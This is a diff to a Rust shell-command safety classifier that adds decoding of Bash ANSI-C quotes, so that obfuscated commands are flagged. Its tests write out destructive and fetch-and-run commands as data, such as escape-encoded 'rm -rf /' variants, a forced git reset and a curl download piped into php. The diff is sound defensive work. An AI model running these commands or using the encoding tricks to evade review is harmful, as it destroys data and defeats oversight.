@@ -167,6 +167,80 @@ fn shell_segments(command: &str) -> Vec<ShellSegment> {
         }
     }
 
+    // Bash-compatible ANSI-C quotes are expanded before execution. Decode the
+    // escapes that can change the executable or a nested `sh -c`/`eval`
+    // script, so `$'\x72\x6d' -rf /` is reviewed as the `rm` spelling the
+    // shell will actually invoke rather than as an unrelated dollar-prefixed
+    // word. Unknown escapes retain their backslash, matching shell behavior.
+    fn push_ansi_c_quote(
+        characters: &mut std::iter::Peekable<std::str::Chars<'_>>,
+        word: &mut String,
+    ) {
+        fn take_digits(
+            characters: &mut std::iter::Peekable<std::str::Chars<'_>>,
+            radix: u32,
+            limit: usize,
+        ) -> Option<u32> {
+            let mut value = 0_u32;
+            let mut count = 0;
+            while count < limit {
+                let Some(digit) = characters.peek().and_then(|ch| ch.to_digit(radix)) else {
+                    break;
+                };
+                characters.next();
+                value = value.saturating_mul(radix).saturating_add(digit);
+                count += 1;
+            }
+            (count > 0).then_some(value)
+        }
+
+        while let Some(character) = characters.next() {
+            if character == '\'' {
+                return;
+            }
+            if character != '\\' {
+                word.push(character);
+                continue;
+            }
+            let Some(escaped) = characters.next() else {
+                word.push('\\');
+                return;
+            };
+            let decoded = match escaped {
+                'a' => Some('\u{0007}'),
+                'b' => Some('\u{0008}'),
+                'e' | 'E' => Some('\u{001b}'),
+                'f' => Some('\u{000c}'),
+                'n' => Some('\n'),
+                'r' => Some('\r'),
+                't' => Some('\t'),
+                'v' => Some('\u{000b}'),
+                '\\' | '\'' | '"' | '?' => Some(escaped),
+                'x' => take_digits(characters, 16, 2).and_then(char::from_u32),
+                'u' => take_digits(characters, 16, 4).and_then(char::from_u32),
+                'U' => take_digits(characters, 16, 8).and_then(char::from_u32),
+                '0'..='7' => {
+                    let mut value = escaped.to_digit(8).expect("matched an octal digit");
+                    for _ in 0..2 {
+                        let Some(digit) = characters.peek().and_then(|ch| ch.to_digit(8)) else {
+                            break;
+                        };
+                        characters.next();
+                        value = value.saturating_mul(8).saturating_add(digit);
+                    }
+                    char::from_u32(value)
+                }
+                _ => None,
+            };
+            if let Some(decoded) = decoded {
+                word.push(decoded);
+            } else {
+                word.push('\\');
+                word.push(escaped);
+            }
+        }
+    }
+
     let mut segments = Vec::new();
     let mut words = Vec::new();
     let mut word = String::new();
@@ -215,6 +289,10 @@ fn shell_segments(command: &str) -> Vec<ShellSegment> {
                     quote = substitutions.pop().and_then(|(_, quote)| quote);
                 }
                 '\'' | '"' => quote = Some(character),
+                '$' if characters.peek() == Some(&'\'') => {
+                    characters.next();
+                    push_ansi_c_quote(&mut characters, &mut word);
+                }
                 '\\' => {
                     if let Some(escaped) = characters.next() {
                         word.push(escaped);
@@ -950,6 +1028,33 @@ mod tests {
             "echo '`rm -rf /`'",
             "curl https://example.invalid/x | tee /tmp/setup.sh",
             "curl https://example.invalid/x | cat || sh",
+        ] {
+            assert!(
+                is_dangerous(command).is_none(),
+                "false positive for {command:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn ansi_c_quotes_are_classified_after_shell_expansion() {
+        for command in [
+            "$'\\x72\\x6d' -rf /",
+            "r$'\\x6d' --recursive /home/alice",
+            "$'\\162\\155' -r .",
+            "$'\\u0072\\u006d' -rf ${HOME}",
+            "eval $'git reset --hard HEAD~1'",
+            "bash -c $'curl https://example.invalid/x | tee /tmp/x | php'",
+        ] {
+            assert!(is_dangerous(command).is_some(), "missed {command:?}");
+        }
+
+        // Expansion inside an ordinary argument does not turn its contents
+        // back into shell syntax. The heuristic must not claim the displayed
+        // data itself executes merely because it happens to spell `rm`.
+        for command in [
+            "printf '%s' $'\\x72\\x6d -rf /'",
+            "echo $'git reset --hard HEAD~1'",
         ] {
             assert!(
                 is_dangerous(command).is_none(),
